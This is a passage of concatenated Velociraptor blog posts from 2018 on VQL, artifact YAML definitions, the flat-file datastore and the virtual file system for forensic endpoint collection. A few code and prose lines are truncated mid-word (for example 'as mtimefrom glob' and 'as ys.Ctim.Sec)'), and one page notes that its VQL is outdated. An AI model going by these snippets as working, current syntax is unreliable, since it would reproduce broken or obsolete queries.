monitoring tools (With GRR then Rekall Agent) we implemented the ability
to collect files, registry keys and other data. If an analyst wanted to
collect, say the chrome extensions, they would need to know where chrome
extensions typically reside (
`%homedir%/.config/google-chrome/Extensions/**`) and enter that in each
time.

We soon realized this was error prone and required too much mental
overhead for analysts to constantly remember these details. GRR inspired
the creation of the Forensic Artifacts project. It was created in order
to solve the problem of documenting and sharing knowledge about forensic
evidence file and registry location.

Further, since GRR can only collect files and has limited parsing
support, the parsing and interpretation of the artifacts is not
specified. GRR Artifacts can only specify file sets (via globs),
registry key/value sets and collections of other artifacts. These are a
bit limited in their expressiveness, and so it means that GRR has to
augment forensic artifacts with a lot of GRR specific things (like post
processing, parsing etc) to make them useful. Although Forensic
Artifacts are supposed to be tool agnostic they carry over a lot of GRR
implementation details (e.g. the knowledge base interpolations, glob
patterns etc).

Next came OSQuery with their SQL like syntax. This was a huge
advancement at the time because it allows users to customize the data
they obtained from their endpoint, and ask questions from the entire
enterprise at once. For the first time it was possible to combine data
from multiple sources (i.e. OSQuery \"tables\") in an intelligent way
and customize the output to fit a processing pipeline, rather than write
a lot of interface glue code to filter and extract data.

Currently OSQuery has grown many tables - each table typically
implements a specific parser to extract one set of data. In this sense
OSQuery also solves the same problem as GRR\'s artifacts - they provide
a single named entity (called a table in OSQuery) which produces results
about one type of thing (e.g. arp\_cache table produces results about
the arp cache entries). The user can then just ask for the ARP cache and
doesn't care how we get it.

The next logical development was the development of Velociraptor Query
Language (VQL). VQL is not pure SQL - instead it is an SQL like language
with a severely reduced feature set. The main difference with regular
SQL is the ability to provide arguments to table names - that is a VQL
plugin is a data source that can receive arbitrary arguments.

This changes the entire game - since we can now provide high level
functions to control plugin execution. Combined with the VQL ability to
combine multiple queries into subqueries this opens the door for very
complex types of queries.

For example, consider the OSQuery users table. This table reads the
system\'s /etc/passwd file and parses out the different columns. It is
hard coded into the OSQuery binary. While this is a very simple table,
it shares its operation with many other similar tables. Other tables
open similar files, parse them line by line and return each field as the
query\'s columns. There are many similar files that contain useful
information on a system. If one was to add a parser for each one in
OSQuery, then they need to write a small amount of code, recompile the
binary and push it out to clients.

Re-deploying new code to endpoints is a difficult task in practice.
There is testing and release processes to employ. Furthermore if a local
modification is made to OSQuery one needs to submit PRs upstream,
otherwise the codebases may diverge and maintainance would be difficult.

Rather than have a built in plugin for each such table, Velociraptor
simply includes a number of generic parsers which may be reused for
parsing different files. For example, consider the following VQL Query:

``` {.sourceCode .sql}
SELECT User, Desc, Uid, Gid, Homedir, Shell FROM parse_records_with_regex(
      file="/etc/passwd",
      regex='(?m)^(?P<User>[^:]+):([^:]+):' +
            '(?P<Uid>[^:]+):(?P<Gid>[^:]+):(?P<Desc>[^:]*):' +
            '(?P<Homedir>[^:]+):(?P<Shell>[^:\\s]+)')
```

The `parse_records_with_regex()` plugin simply applies one or more regex
to a file and each match is sent as a record. In this case, each line is
matched and parsed into its components automatically. Note how the query
produces the same results as OSQuery\'s users table, but uses completely
generic parsers.

The generic parser can be used to parse many other file types. Here is
query which parses debian apt-source lines:

``` {.sourceCode .sql}
SELECT * FROM parse_records_with_regex(
   file="/etc/apt/sources.list",
   regex="(?m)^ *(?P<Type>deb(-src)?) "+
         "(?:\\[arch=(?P<Arch>[^\\]]+)\\] )?" +
         "(?P<URL>https?://(?P<base_uri>[^ ]+))" +
         " +(?P<components>.+)")
```

Having the ability to control parsing directly in the query opens up
many possibilities. What if we need to parse new files which do not have
an OSQuery parser yet (maybe an enterprise application configuration
file)? We can easily construct a query using the generic parsers and
issue it to the endpoint to support new file format.

Velociraptor Artifacts
======================

In the previous section we saw how we can express very complex queries
to support novel parsing scenarios. However it is hard for users to
directly issue the queries - who can remember this complex regex and
type it in every time?

We clearly need some way to record the queries in a simple, reusable
way. This sounds a lot like GRR\'s Artifacts! What if we could just
write the complex query in a YAML file and then just said to
Velociraptor - go collect that artifact and the correct queries would be
issued to the client automatically.

Rather than try to make artifacts generic, we define Velociraptor
Artifacts as YAML files which simply bundle together a bunch of VQL
statements that together run a particular query. In a sense,
Velociraptor\'s artifacts are similar to OSQuery\'s table definition
(since they specify output columns), except they are defined completely
by the YAML definition file, using generic reusable VQL plugins, put
together with VQL queries.

Here is an example of the the Linux.Sys.Users artifact - this is the
equivalent artifact to OSQuery\'s users table:

``` {.sourceCode .yaml}
name: Linux.Sys.Users
description: Get User specific information like homedir, group etc from /etc/passwd.
parameters:
  - name: PasswordFile
    default: /etc/passwd
    description: The location of the password file.
sources:
  - precondition: |
     SELECT OS From info() where OS = 'linux'
    queries:
      - SELECT User, Desc, Uid, Gid, Homedir, Shell
         FROM parse_records_with_regex(
           file=PasswordFile,
           regex='(?m)^(?P<User>[^:]+):([^:]+):' +
                 '(?P<Uid>[^:]+):(?P<Gid>[^:]+):(?P<Desc>[^:]*):' +
                 '(?P<Homedir>[^:]+):(?P<Shell>[^:\\s]+)')
```

The artifact has a specific name (Linux.Sys.Users) and a description.
The Artifact will only run if the precondition is satisfied (i.e. if we
are running on a linux system). Running the artifact locally produces
the following output:

``` {.sourceCode .console}
$ velociraptor artifacts collect Linux.Sys.Users
+-------------------+-------------------------+-------+-------+--------------------------+
|       USER        |              DESC       |  UID  |  GID  |         HOMEDIR          |
+-------------------+-------------------------+-------+-------+--------------------------+
| root              | root                    |     0 |     0 | /root                    |
| daemon            | daemon                  |     1 |     1 | /usr/sbin                |
| bin               | bin                     |     2 |     2 | /bin                     |
| sys               | sys                     |     3 |     3 | /dev                     |
| sync              | sync                    |     4 | 65534 | /bin                     |
| games             | games                   |     5 |    60 | /usr/games               |
| man               | man                     |     6 |    12 | /var/cache/man           |
| lp                | lp                      |     7 |     7 | /var/spool/lpd           |
| mail              | mail                    |     8 |     8 | /var/mail                |
```

Why would I want to use Artifacts?
==================================

We just demonstrated that Velociraptor\'s artifact produces the same
output as OSQuery\'s users table - so what? Why use an artifact over
hard coding the table in the executable?

Velociraptor is inherently a remote endpoint monitoring agent. Agents
are installed on many end points and once installed it is often
difficult to remotely update them. For various reasons, endpoints are
often difficult to upgrade - for example, they might be off the
corporate LAN, or have a broken update agent.

In particular, when responding to a major incident, we often have to
rapidly deploy a new hunt to search for an indicator of compromise. In
most cases we don\'t have time to go through proper software deployment
best practice and upgrade our endpoint agent in rapid succession (it
typically takes weeks to have endpoint agents upgraded).

However, Velociraptor\'s artifacts allow us to write a new type of
parser immediately since it is just a YAML file with VQL statements, we
can push it immediately to the clients with no code changes, rebuild, or
redeploy scripts. That is very powerful!

Not only can we add new artifacts, but we can adapt artifacts on the fly
to different systems - perhaps there is a slightly different version of
Linux which keeps files in different locations? Or maybe a slightly
different format of the file we are trying to parse. Being able to adapt
rapidly is critical.

So how do I use Artifacts?
==========================

Velociraptor exposes artifacts via two main mechanisms. The first is the
Artifact Collector flow. This flow presents a special GUI which allows
us to view the different artifacts, choose which ones we want to launch
and describes them:

![](artifacts_how_to.png)

As we can see in the screenshot above, the artifact collector flow
allows the user to inspect the artifacts, before issuing the VQL to the
client. The responses are received by the server and displayed as part
of the same flow:

![](artifacts2.png)

This is a pretty easy set and forget type system. However, Velociraptor
makes artifacts available within any VQL query too. The artifact simply
appears as another VQL plugin. Consider the following VQL Query that
filters only user accounts which have a real shell:

``` {.sourceCode .console}
$ velociraptor query --format text "SELECT * FROM Artifact.Linux.Sys.Users() where Shell =~ 'bash'"
+------+------+------+------+-----------+-----------+
| USER | DESC | UID  | GID  |  HOMEDIR  |   SHELL   |
+------+------+------+------+-----------+-----------+
| root | root |    0 |    0 | /root     | /bin/bash |
| mic  |      | 1000 | 1000 | /home/mic | /bin/bash |
+------+------+------+------+-----------+-----------+
SELECT * FROM Artifact.Linux.Sys.Users() WHERE Shell =~ 'bash'
```

An artifact definition can use other artifacts by simply issuing queries
against these artifact plugins. This forms a natural system of
interdependency between artifacts, and leads to artifact reuse.

How powerful are Velociraptor Artifacts?
----------------------------------------

Previously we described Velociraptor artifacts as having some properties
in common with GRR\'s artifacts (pure YAML, reusable and server side)
and OSQuery\'s tables (very detailed and potentially complex parsers,
directly using APIs and libraries). We said that Velociraptor attempts
to replace many of the specific \"one artifact per table\" model in
OSQuery with a set of YAML files referencing generic plugins.

Velociraptor\'s artifacts can never fully emulate all OSQuery\'s tables
because some OSQuery tables call specific APIs and have very complex
operation. However, most of OSQuery\'s tables are fairly simple and can
be easily emulated by Velociraptor artifacts. In this sense
-Velociraptor lies somewhere in between GRR\'s simple collect all files
and registry keys without parsing them, and OSQuery\'s specialized
parsers. However VQL is quite capable, as we shall see. Although we can
not implement all tables using pure VQL queries, the ability to
implement many artifacts this way provides us with unprecedented
flexibility and enables rapid response to evolving threats.

Let\'s looks at some artifacts that demonstrate this flexibility.

Parsing debian packages.
------------------------

Debian packages keep a manifest file with records delimited by an empty
line. Each record consists of possible fields.

``` {.sourceCode .sql}
- LET packages = SELECT parse_string_with_regex(
     string=Record,
     regex=['Package:\\s(?P<Package>.+)',
            'Installed-Size:\\s(?P<InstalledSize>.+)',
            'Version:\\s(?P<Version>.+)',
            'Source:\\s(?P<Source>.+)',
            'Architecture:\\s(?P<Architecture>.+)']) as Record
     FROM parse_records_with_regex(
            file=linuxDpkgStatus,
            regex='(?sm)^(?P<Record>Package:.+?)\\n\\n')

- SELECT Record.Package as Package,
      Record.InstalledSize as InstalledSize, Record.Version as
      Version, Record.Source as Source, Record.Architecture as
      Architecture
  from packages
```

The above query uses the parse\_records\_with\_regex() plugin to split
the file into records (anything between the Package: and the next empty
line). Each record is then parsed separately using the
parse\_string\_with\_regex() VQL function. Being able to parse in two
(or more) passes makes writing regexes much easier since they can be
simplified greatly.

Complex multi-query example: Chrome extensions.
-----------------------------------------------

An example of a sophisticated artifact is the chrome extensions
artifact. It implements the following algorithm:

1.  For each user on the system, locate all chrome extension manifest
    files by using a glob expression.
2.  Parse the manifest file as JSON
3.  If the manifest contains a \"default\_locale\" item, then locate the
    locale message file.
4.  Parse the locale message file.
5.  Extract the extension name - if the extension has default locale
    then return the string from the locale file, otherwise from the
    manifest file.

The full artifact is rather long so will not be listed here in full, but
are a couple of interesting VQL plugins which make writing artifacts
more powerful.

The foreach() plugin runs a query and for each row produced, a second
query is run (with the first row present in the scope). This is similar
to SQL\'s JOIN operator but more readable. For example the following
query executes a glob on each user\'s home directory (as obtained from
the password file):

``` {.sourceCode .console}
LET extension_manifests = SELECT * from foreach(
 row={
    SELECT Uid, User, Homedir from Artifact.Linux.Sys.Users()
 },
 query={
    SELECT FullPath, Mtime, Ctime, User, Uid from glob(
      globs=Homedir + '/' + extensionGlobs)
 })
```

Note how the query is assigned to the variable \"extension\_manifests\"
which can be used as an input to other queries. The if() plugin
evaluates a condition (or a query) and runs the \"then\" query if true,
or the \"else\" query:

``` {.sourceCode .console}
LET maybe_read_locale_file = SELECT * from if(
     condition={
        select * from scope() where Manifest.default_locale
     },
     query={
        SELECT Manifest, Uid, User, Filename as LocaleFilename,
               ManifestFilename, parse_json(data=Data) AS LocaleManifest
        FROM read_file(
                -- Munge the filename to get the messages.json path.
                filenames=regex_replace(
                  source=ManifestFilename,
                  replace="/_locales/" + Manifest.default_locale + "/messages.json",
                  re="/manifest.json$"))
     },
     else={
         -- Just fill in empty Locale results.
         SELECT Manifest, Uid, User, "" AS LocaleFilename, "" AS ManifestFilename,
                "" AS LocaleManifest FROM scope()
     })
```

Parsing binary data: Wtmp file parser.
--------------------------------------

It is also possible to parse binary files with VQL. For example,
consider the wtmp file parser implemented in the Linux.Sys.LastUserLogin
artifact. This artifact uses the binary\_parser() VQL plugin which
accepts a Rekall style profile string to instantiate an iterator over
the file. Since the wtmp file is simply a sequence of wtmp structs, we
can iterate over them in a query.

``` {.sourceCode .console}
SELECT * from foreach(
         row={
           SELECT FullPath from glob(globs=split(string=wtmpGlobs, sep=","))
         },
         query={
           SELECT ut_type, ut_id, ut_host as Host, ut_user as User,
                 timestamp(epoch=ut_tv.tv_sec) as login_time
           FROM binary_parse(
                  file=FullPath,
                  profile=wtmpProfile,
                  iterator="Array",
                  Target="wtmp"
                )
         })
```

The future
----------

We started implementing many of the simpler OSQuery tables using VQL.
For the remaining tables (the ones that need to call out to libraries or
more complex APIs), we will integrate these using a set of specialized
VQL plugins over time.

---END OF FILE---

======
FILE: /content/blog/html/2018/08/10/the_velocidex_query_language.md
======
---
date: 2018-08-10T04:10:06Z
description:  |
  Velociraptor is powered by VQL and VQL is the killer feature which
  makes it so powerful. But what exactly is VQL? This section is a quick
  overview of VQL.

title: Velocidex Query Language (VQL)
categories: ["Blog"]
---

{{% notice warning %}}

This page is written about a very old version of VQL and is retained
for historical purposes. Current VQL works differently - consult the
current documentation.

{{% /notice %}}


VQL Overview
============

VQL is only loosely based around SQL in the sense that the general
statement structure is similar. However, VQL is a very simple dialect.
Like SQL, a VQL query produces a table of results with specific columns
and multiple rows. Unlike SQL, the data inside each cell is not limited
to simple primitive types (like string, integer etc). In fact any JSON
serializable object can be generated in a table\'s cell. It is not
uncommon to generate an entire JSON object with additional fields in
each row for a single column.

The basic structure of a VQL statement is:

```vql
SELECT Column1, Column2, Column3
FROM plugin(arg=value) WHERE Column1 > 5
```

There are three main parts: Column selectors, Plugin and Filter
Conditions.

Plugins
-------

The VQL plugin is VQL\'s data source. Plugins are specific pieces of
code which may accept arguments and generate a sequence of rows. VQL\'s
strength is that these plugins are very easy to write and can be added
to Velociraptor in order to add extra functionality.

Unlike SQL, VQL plugins take keyword arguments. This allows Velociraptor
plugins to be easily customizable and adaptable. For example, a plugin
may list all chrome extensions, and receive an argument pointing it to
the user\'s home directory so it can flexibly be applied to different
situations. The ability to provide arguments to plugins encourages
writing more generic plugins which can be reused in multiple situations.

{{% notice note %}}

VQL plugins currently only accept keyword arguments. It is a syntax
error to pass args without naming them - `glob("/bin/*")` is not valid
syntax, it should be `glob(globs="/bin/*")`

{{% /notice %}}

It is important to appreciate that Plugins generate data dynamically.
The data is not stored in a database table first! Plugins may begin
generating data immediately and the VQL query will begin processing this
data, even if the total amount of data is very large. The Plugin\'s data
is not stored in memory all at once! This allows for plugins to produce
an unbounded number of rows and the query will proceed until the
required number of results is achieved.

Plugins may also be cancelled when the query completes, even if the
plugin itself is not exhausted.

Column selectors
----------------

The Column selectors are a group of expressions specifying which columns
will be produced in the output table. As mentioned previously, the
values produced in each column are not limited to simple types -it is
common to produce entire JSON objects (and even additional tables),
lists of values etc.

The column selectors specify a transformation to be performed on the
output of the plugin in producing the query\'s columns. The simplest
transformation is a single \"\*\", which means no transformation at all
(i.e. relay to the output table exactly the output of the plugin).

Since plugins may produce any object (for example, a JSON object with
nested fields), VQL column specifications can dereference nested fields
within the produced data.

```vql
SELECT Sys.Mtim.Sec FROM glob(globs="/bin/*")
```

Specifying only selected columns can limit the number of columns
produced and make the output more useful by removing unneeded fields.
For example the following will produce a result table with two columns
named FullPath and SIze and a row per file found in the /bin/ directory:

```vql
SELECT FullPath, Size from glob(globs="/bin/*")
```

Column specifications can consist of arbitrary expressions - for example
addition, comparisons:

```vql
SELECT FullPath + '.bindir', Size from glob(globs="/bin/*") WHERE Size < 1000
```

In this case it is often useful to add a Column Alias (Note that column
aliases can also be used in the WHERE clause):

```vql
SELECT FullPath + '.bindir' as Sanitized, Size from glob(globs="/bin/*")
```

VQL Functions provide a way to extend VQL expressions. Unlike full
plugins they do not produce a sequence of rows, but simply produce a
single value (which can be an arbitrary o function formats a timestamp
as a string. This is useful since many plugins produce times in seconds
since epoch time:

```vql
SELECT FullPath, timestamp(epoch=Sys.Mtim.Sec) as mtimefrom glob(globs="/bin/*")
```

{{% notice note %}}

Some VQL functions have side effects, or are more expensive to run. It
is important to understand that VQL transforms the columns emitted from
a plugin BEFORE it applies filtering conditions. This is needed in order
to allow for column transformations to participate in the filter
condition (via the alias).

Due to this order of operations the following query will upload all
files, ignoring the WHERE condition because the upload() function will
be evaluated on each row, even if the WHERE clause causes the row to be
ignored:

```vql
SELECT FullPath, upload(path=FullPath)
 from glob(globs="/bin/*")
      WHERE Name =~ "bash"
```

To upload only the files matching the expression, the query must be
split into two - the first query applies the filtering condition and the
second query does the upload:

```vql
LET files = SELECT FullPath from glob(globs="/bin/*")
    WHERE Name =~ "bash"
SELECT FullPath, upload(path=FullPath) from files
```
{{% /notice %}}

VQL Subselects
--------------

Unlike SQL, VQL does not have a join operator. SQL is designed to work
with databases, and databases have multiple strategies for optimizing
query execution (like adding table indexes, query planners etc).
Traditionally, SQL authors prefers joins over subselects because in a
real database JOIN operations are more optimized to use the database\'s
indexes and query optimizer. However JOIN operations are arguably harder
to read and it is hard to predict the order at where operations will be
run (e.g. which table will use an index and which will use a row scan).

Since VQL has no indexes nor does it have a query optimizer,
implementing JOIN operations does not make sense. Instead, VQL
implements subselects and multi-statement queries and using these tools
it is possible for VQL authors to precisely control the query execution
plan so it is most efficient.

In this sense VQL authors are left to specify the most efficient course
of query execution themselves instead of relying on a query optimizer.
This is normally done by dividing the query into smaller queries and
combining their results in the best order.

Consider the following query that attempts to search small files for the
keyword \"foobar\":

``` {.sourceCode .sql}
SELECT FullPath from glob(globs="/bin/*") where
   grep(path=FullPath, keywords=["foobar"]) and Size < 1000
```

Velociraptor will execute the following steps:

1.  Run the glob() plugin to produce all the files in the /bin/
    directory
2.  Transform each row to produce the FullPath.
3.  Evaluate the Filter condition on each row. The filter condition
    requires running the grep() plugin on each file looking for the
    keyword and evaluating if the SIze of the file is less than 1000.
4.  If both conditions are TRUE then Velociraptor will emit the row into
    the result table.

It is obvious that this is an inefficient query because each and every
file will be searched for the keyword regardless of its size. However,
there is no point even trying if the file size is not less than 1000
bytes!

The problem here is that there are two conditions which both must be
true - but each condition has a different cost associated with it.
Clearly the grep() condition is more expensive since it requires opening
the file and reading it completely. The Size condition is extremely
cheap since it is just an integer comparison.

However, VQL is not aware of the relative cost of the two conditions -it
does not know that grep() is inherently an expensive operation since to
VQL it just looks like another function. Although VQL does some
short cutting (for example it will cancel the grep() function if Size \>=
1000) this shortcut cancellation may arrive too late to stop grep() from
doing a significant amount of work. The VQL author must be aware of the
relative costs of the different operations and how the query should be
structured for maximum efficiency.

What we would really like is for VQL to evaluate the cheap condition,
and only for those files smaller than 1000 bytes, evaluate the grep()
condition. This allows us to eliminate most files immediately (since
most files are larger than 1000 bytes) such that we only bother to
grep() very few files.

This can be achieved by splitting the query into two and chaining them
together:

``` {.sourceCode .sql}
LET file = select * from glob(globs="/bin/*") WHERE Size < 1000

SELECT FullPath from file WHERE grep(
   path=FullPath, keywords=["foobar"])
```

The LET keyword allows us to define a \"stored query\". A Stored Query
is a query which is assigned into a variable name - you can think of the
statement as running the entire query and storing the output into a
single variable.

The second query then takes the result of this query and applies further
transformations and filtering on it. By ensuring that the cheap
conditions are evaluated in the stored query, we can ensure that the
number of rows stored in the LET expression is smaller than the total
number of rows produced by the glob() plugin, and therefore the grep()
function will be applied on few rows.

::: {.note}
::: {.admonition-title}
Note
:::

You can think of stored queries as running in multiple steps: First the
LET query is executed, then all its rows are stored in the files
variable, while the second query reads each row and applies its own
filtering on it. In reality though, the LET query is lazy in its
evaluation and will only produce results when required. Velociraptor
does not store the entire result table of the LET query in memory at
once! It is quite safe therefore to run a very large query in the LET
clause without fear of memory overrun.
:::

Escaping parameters
-------------------

VQL queries often need to take user input. For example consider the
query:

``` {.sourceCode .sql}
SELECT FullPath from glob(globs="/bin/*")
```

We might want to allow the user to specify the glob expression and
create the query programmatically. While it is possible to ensure user
input is escaped this is inefficient and tedious.

VQL queries have an \"Environment\". The Environment is essentially the
evaluation scope of the query - in other words it contains all the
values which can be accessed by name. For example when we call a VQL
function like timestamp(), it is placed in the evaluation scope. It is
possible to place anything in the environment (or the evaluation scope)
and in particular, user parameters can also be placed there. In this
case there is no need to escape user input as it is treated as a part of
the environment and not the query. For example placing PATH=\"/bin/\*\"
into the environment, will allow the following query to run
successfully:

``` {.sourceCode .sql}
SELECT FullPath from glob(globs=PATH)
```

You should always try to write VQL queries referring to parameters in
the environment because this makes them reusable - the scope parameters
become inputs to your query and the query becomes a reusable function.

---END OF FILE---

======
FILE: /content/blog/html/2018/08/10/files_files_everything_is_just_a_file.md
======
---
date: 2018-08-10T04:10:06Z
description:  |
  Velociraptor introduced a major redesign of the underlying data
  store architecture. The default data store
  is now the FileBaseDataStore which stores all data in flat files.

title:  Files, files everything is just a file!
linktitle:  20180810 Files, files everything is just a file!
categories: ["Blog"]
---


GRR\'s original design abstracted the data storage to a simple key/value
store originally based around Bigtable. For open source deployments
various key value stores were used starting from MongoDB, to SQLite and
finally MySQL. Although the original idea was to use a simple key/value
implementation, due to locking requirements the data store
implementation became very complex.

As Velociraptor introduced a major redesign of the underlying data store
architecture, we are now able to relax our demands of the datastore and
use a true key/value model (since we have no requirements for locking
and synchronization). The default data store is now the
FileBaseDataStore which stores all data in flat files.

Using flat files over a database has many advantages, including ease of
deployment, and simplification of the data model. Having flat files
allows one to use standard tools to visualize Velociraptor\'s data
structures (e.g. with less), archive old data (e.g. with tar/zip) and
clean up old data (e.g. with find/rm). Velociraptor also includes an
inspect command which allows users to decode the stored files and
provides context as to what these files actually mean. This simplicity
increases the transparency in the system and makes it more accessible
for deployers, while increasing reliability, stability and speed.

In the following section we examine some of the files in the datastore
and see how they relate to the features we discuss elsewhere in this
document.

File organization
=================

The Velociraptor data store needs to provide only two types of
operations: Read and Write complete files and list files in a directory.
Using only these primitives we can implement the entire filestore. Most
modern file systems provide very fast file creation, reading and
deletion, as well as fast directory listing, even when containing
millions of files. Modern file systems also provide advanced features
like caching, journaling and rollbacks so it is not such a crazy idea to
use the file systems themselves as a data store.

Let\'s begin by listing the files in a typical Velociraptor file store
using the find command. We then use the velociraptor inspect command to
view the file\'s content.

Searching
---------

Searching for clients is implemented by simply creating empty files in
directories based on the search term. For example in order to retrieve
all clients which have the user \"mic\", we simply list the directory
`client\_index/user%3Amic`:

``` {.sourceCode .console}
$ find ./client_index/
```

```text
 ./client\_index/c.84216c7aab97557d
 ./client\_index/c.84216c7aab97557d/C.84216c7aab97557d.db./client\_index/user%3Amic
 ./client\_index/user%3Amic/C.84216c7aab97557d.db
 ./client\_index/user%3Amic/C.1b0cddfffbfe40f5.db./client\_index/all
 ./client\_index/all/C.84216c7aab97557d.db
 ./client\_index/all/C.1b0cddfffbfe40f5.db
```

Modern file systems can hold many thousands of files in the same
directory and list these very quickly. This feature is only really used
in the GUI\'s search box but can also be used to script or post process
collected data.

Client information
------------------

Information about each client is kept in a directory based on the
client\'s ID:

``` {.sourceCode .console}
./C.0fc63b45671af1a6/ping.db                   <- Last ping stats.
./C.0fc63b45671af1a6/key.db                    <- Client's public key
./C.0fc63b45671af1a6/flows
./C.0fc63b45671af1a6/flows/F.a8787c26.db       <- Flows running on this client.
./C.0fc63b45671af1a6/flows/F.e05952ff.db
./C.0fc63b45671af1a6/tasks
./C.0fc63b45671af1a6/tasks/1533517805834284.db <- Client messages waiting to be collected.
./C.0fc63b45671af1a6/tasks/1533517805834283.db
./C.0fc63b45671af1a6/tasks/1533517206859989.db
./C.0fc63b45671af1a6/tasks/1533517206860477.db
./C.84216c7aab97557d.db                        <- Client information (from Interrogate).
```

Each piece of data is kept in its own file as an encoded protobuf. Files
all have their names end with \".db\". Velociraptor has an inspect
command which decodes the protobuf and displays it in a human friendly
way. For example let us see what information we keep about each s last
poll:

``` {.sourceCode .console}
$ velociraptor --config server.yaml inspect /tmp/velociraptor/C.2d406f47d80f5583/ping.db
{
  "ipAddress": "127.0.0.1:33600","ping": "1533517053018582"
}
```

The Flow\'s results.
--------------------

Velociraptor\'s flows typically only produce VQL results. As described
above, the VQL results are typically split into parts by the client (by
default 10000 rows per part), and Velociraptor simply writes these in
the flow\'s directory:

``` {.sourceCode .console}
./C.1b0cddfffbfe40f5/flows/F.a31255a1
./C.1b0cddfffbfe40f5/flows/F.a31255a1/results
./C.1b0cddfffbfe40f5/flows/F.a31255a1/results/0.db   <- VQL result part 1.
./C.1b0cddfffbfe40f5/flows/F.a31255a1.db             <- Flow information.
```

Velociraptor\'s inspect command understands that VQL collections
represent a table of results, and so it displays these in a more
friendly way.

``` {.sourceCode .console}
$ velociraptor --config server.yaml inspect /tmp/velociraptor/C.1b0cddfffbfe40f5/flows/F.a31255a1/results/0.db
+-------+----------------+---------+------+-----------------------------+----------------------------+
| ISDIR |    FULLPATH    |  SIZE   | MODE |            MTIME            |            ATIME           |
+-------+----------------+---------+------+-----------------------------+----------------------------+
| false |  /bin/bash     | 1037528 |  493 |  2017-05-16T22:49:55+10:00  |  2018-01-22T12:47:25+10:00 |
| false |  /bin/busybox  | 1964536 |  493 |  2015-08-19T22:07:39+10:00  |  2018-01-23T15:41:46+10:00 |
+-------+----------------+---------+------+-----------------------------+----------------------------+
File Finder Response: SELECT IsDir , FullPath , Size , Mode , mtime , atime , ctime,
   upload(file=FullPath)as Upload FROM files
```

We can also see the original VQL query which was run to produce this
output. The bottom line, though, is that the entire flow\'s result is
just a flat JSON encoded file. You can easily decode the data using any
programming language and post process it in whatever way is appropriate
(e.g. export the results to BigQuery or ElasticSearch). Velociraptor
does not really do anything with the result other than just store it on
disk.

The Virtual File System
-----------------------

As described above, Velociraptor\'s VFS consists of VQL tables for each
directory on the client, listing the entire directory content:

``` {.sourceCode .console}
./C.1b0cddfffbfe40f5/vfs/usr/share/doc/gir1.2-freedesktop.db
./C.1b0cddfffbfe40f5/vfs/usr/share/doc/libdatrie1.db
./C.1b0cddfffbfe40f5/vfs/usr/share/doc/dh-strip-nondeterminism.db
./C.1b0cddfffbfe40f5/vfs/usr/share/doc/libcap2-bin.db
./C.1b0cddfffbfe40f5/vfs/usr/share/doc/libsoup2.4-1.db
./C.1b0cddfffbfe40f5/vfs/usr/share/doc/libgphoto2-port12.db
./C.1b0cddfffbfe40f5/vfs/usr/share/doc/libsodium18.db
```

Inspecting each of these shows it is just a simple VQL table. This
particular VFS entry was produced from a recursive directory listing of
/usr (of depth 5).

``` {.sourceCode .console}
$ velociraptor --config server.yaml inspect .../vfs/usr/share/doc/libcap2-bin.db
+-------+--------------------------------+---------------------+------+-----------+--------------------
| ISDIR |            FULLPATH            |        NAME         | SIZE |   MODE    |           MTIME
+-------+--------------------------------+---------------------+------+-----------+--------------------
| false | /usr/share/doc/libcap2-bin/REA | README.Debian       | 1149 |       420 | 2015-10-02T23:34:07
|       | DME.Debian                     |                     |      |           |
| false | /usr/share/doc/libcap2-bin/cha | changelog.Debian.gz |   30 | 134218239 | 2015-10-24T07:11:34
|       | ngelog.Debian.gz               |                     |      |           |
| false | /usr/share/doc/libcap2-bin/cop | copyright           | 4367 |       420 | 2015-10-02T23:34:07
|       | yright                         |                     |      |           |
+-------+--------------------------------+---------------------+------+-----------+--------------------
/usr: SELECT IsDir, FullPath as _FullPath, Name, Size, Mode, timestamp(epoch=Sys.Mtim.Sec) as mtime,
  timestamp(epoch=Sys.Atim.Sec) as ys.Ctim.Sec) as ctime FROM glob(globs=path + '/**5')
```

---END OF FILE---

======
FILE: /content/blog/html/2018/08/10/browsing_around_the_filesystem/_index.md
======
---
date: 2018-08-10T04:10:06Z
description:  |
  Browsing the client's filesystem is probably the first thing
  responders do. Both GRR and Velociraptor have a nice VFS abstraction
  that allows users to browse files interactively. However, in order to
  make Velociraptor much faster we made some tradeoffs and improved the
  way that the VFS is stored in the datastore.

title: Browsing around the filesystem.
linktitle: 20180810 Browsing around the filesystem.
categories: ["Blog"]
weight: 10
---

The Virtual File System
=======================

Like GRR, Velociraptor also maintains a virtual file system view (VFS)
of the client\'s filesystem. GRR\'s VFS view is generated by adding a
row for each file into the database. In order to refresh the view of a
certain directory, GRR issues a ListDirectory request and updates the
database by storing each newly discovered file in its own row.

Velociraptor models the client\'s VFS as a per-directory VQL query. In
order to refresh the view of a certain directory, a new VQL query is
issued to the client, essentially collecting the glob information for
that directory in a single VQL response table. The VQL result is then
stored in a single database row. Therefore Velociraptor stores a single
row per directory (as compared to GRR\'s single row per file approach).
This leads to a huge reduction in database rows.

The tradeoff however, is that the Velociraptor VFS view can only show
the state of the entire directory listing at a single point in time.
GRR\'s VFS viewer can show old files (which have been removed) mixed in
with current files because it can merge the output of different
ListDirectory operations that occurred in different times. We decided
this feature was not often useful and sometimes actually led to
confusion since files that are removed from a directory are shown
together with files currently present. Velociraptor therefore shows the
VFS directory at the latest timestamp the entire directory was fetched.

Recursive VFS refresh
=====================

Users who are more familiar with traditional forensic tools (or GUI file
managers like Windows Explorer) usually attempt to browse the client\'s
VFS view interactively, searching for files and directories relevant to
the case. However, since the VFS view is only a cached database view of
the real client\'s file system, we need to go to the client to refresh
the cache whenever we try to view a directory in the VFS which had not
yet been fetched from the client.

Since clients are not always online, some users attempt to just
recursively refresh the entire VFS view (i.e. recursively list all
client directories from the root). This is however, an expensive
operation (This is at least as expensive as running a recursive \"find /
-ls\" command on the commandline). Due to GRR\'s extensive data model
and complex multi-round trip flow model, performing a recursive VFS
refresh with GRR is unlikely to work in any reasonable time (typically
the flow will run for a while then hang due to race conditions in the
frontend).

On the other hand, Velociraptor issues a single VQL request as a
recursive directory glob and stores the entire directory content in a
single VQL response taken at an instance in time. The response is
streamed back to the server. The server simply splits the response table
into directory specific tables, and then stores a single VQL response
table for each directory in the database.

{{% notice note %}}

The VQL glob() plugin is guaranteed to generate results in breadth first
order. This means that it emits information about all files in the same
directory first, before recursing into sub directories. This feature
makes it simple to split the result table into directory specific
sub-tables by simply watching the FullPath column and noting when its
directory changes.


![](image9.png)

{{% /notice %}}

Very large VQL queries
======================

While we claimed above that Velociraptor simply issues a single VQL
query and stores its result in a single database row, this was an
oversimplification. If the VQL query generates too many rows, the
Velociraptor client splits the response into parts (by default 10000
rows per part). This allows data to be uploaded immediately to the
